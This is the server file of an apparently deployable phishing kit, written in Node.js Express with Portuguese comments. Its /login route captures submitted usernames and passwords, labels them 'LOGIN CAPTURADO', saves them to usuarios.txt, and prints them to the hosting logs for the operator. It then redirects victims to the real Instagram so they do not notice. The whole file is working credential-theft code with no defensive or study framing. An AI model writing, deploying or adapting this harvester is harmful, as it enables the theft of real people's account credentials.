const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Isso faz o HTML e CSS funcionarem

// Rota principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rota que recebe os dados do formulário
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const log = `LOGIN CAPTURADO: Usuário: ${username} | Senha: ${password} ---\n`;
    
    // Esse console.log é importante! 
    // No Render, você verá os dados na aba "Logs" do painel.
    console.log("Recebido:", username, password); 

    try {
        fs.appendFileSync('usuarios.txt', log); // Salva no arquivo
    } catch (err) {
        console.error("Erro ao salvar no arquivo:", err);
    }

    res.redirect('https://www.instagram.com'); // Manda pro site real
});

// ALTERAÇÃO AQUI: O servidor agora escolhe a porta automática da internet
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ SITE NO AR! Porta: ${PORT}`);
});